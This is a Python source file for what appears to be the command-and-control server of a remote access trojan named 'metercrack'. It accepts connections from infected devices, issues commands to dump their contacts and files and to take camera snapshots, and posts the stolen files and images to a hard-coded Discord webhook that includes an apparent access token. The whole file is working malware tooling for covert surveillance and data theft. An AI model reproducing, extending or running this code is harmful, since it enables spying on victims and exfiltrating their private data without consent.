import socket
import threading
import os
import requests
import time

# Configuration
LHOST = '0.0.0.0'
LPORT = 9999
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2'

# Server logic
def handle_client(client_socket):
    while True:
        try:
            command = input("metercrack> ").strip()
            client_socket.send(command.encode())

            if command.startswith("dump c"):
                print("Dumping contacts...")
                data = client_socket.recv(4096).decode()
                print(data)

            elif command.startswith("dump f"):
                print("Dumping files...")
                data = client_socket.recv(4096).decode()
                print(data)

            elif command.startswith("send"):
                filename = command.split(" ")[1]
                with open(filename, 'wb') as f:
                    while True:
                        bytes_read = client_socket.recv(4096)
                        if not bytes_read:
                            break
                        f.write(bytes_read)
                print(f"File {filename} downloaded.")
                # Send file to Discord
                with open(filename, 'rb') as f:
                    requests.post(DISCORD_WEBHOOK_URL, files={'file': (filename, f)})

            elif command.startswith("cam_snap"):
                print("Snapping camera...")
                image_data = client_socket.recv(4096)
                requests.post(DISCORD_WEBHOOK_URL, files={'file': ('snapshot.jpg', image_data)})
                print("Camera snapshot sent to Discord.")

        except Exception as e:
            print(f"Error: {e}")
            client_socket.close()
            break

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((LHOST, LPORT))
    server.listen(5)
    print(f"[*] Listening on {LHOST}:{LPORT}")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == "__main__":
    start_server()
